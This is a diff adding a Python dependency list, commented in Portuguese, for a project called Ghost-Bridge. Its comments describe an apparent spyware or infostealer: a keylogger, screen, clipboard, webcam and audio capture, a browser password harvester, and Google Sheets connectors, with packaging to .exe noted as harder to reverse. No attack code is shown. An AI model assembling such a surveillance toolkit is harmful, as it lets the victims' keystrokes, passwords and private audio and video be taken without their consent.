@@ -1,0 +1,54 @@
+# Ghost-Bridge - Dependências Python
+# Instale com: pip install -r requirements.txt
+
+# ==========================================
+# CORE (Obrigatório)
+# ==========================================
+python-dotenv>=1.0.0        # Carrega variáveis do .env
+cryptography>=41.0.0        # AES-256 (Fernet)
+requests>=2.31.0            # HTTP client
+
+# ==========================================
+# CONECTORES (Para modo REAL)
+# ==========================================
+gspread>=5.12.0             # Google Sheets API
+google-auth>=2.23.0         # Autenticação Google
+
+# ==========================================
+# MÓDULOS DE COLETA
+# ==========================================
+
+# Keylogger
+pynput>=1.7.6               # Captura de teclas
+
+# Screenshot
+Pillow>=10.0.0              # Manipulação de imagens
+mss>=9.0.0                  # Captura de tela rápida
+
+# Clipboard (Windows)
+pywin32>=306                # APIs do Windows
+
+# Browser Harvester
+pycryptodome>=3.19.0        # Descriptografia AES (para senhas)
+
+# System Info
+psutil>=5.9.0               # Processos, rede, sistema
+wmi>=1.5.1                  # WMI do Windows
+
+# Webcam
+opencv-python>=4.8.0        # Captura de câmera
+
+# Audio
+pyaudio>=0.2.14             # Gravação de áudio
+
+# ==========================================
+# COMPILAÇÃO (Opcional)
+# ==========================================
+# pyinstaller>=6.0.0        # Compilar para .exe
+# nuitka>=1.8.0             # Alternativa (mais difícil reverter)
+
+# ==========================================
+# DESENVOLVIMENTO (Opcional)
+# ==========================================
+# pytest>=7.0.0             # Testes
+# black>=23.0.0             # Formatação
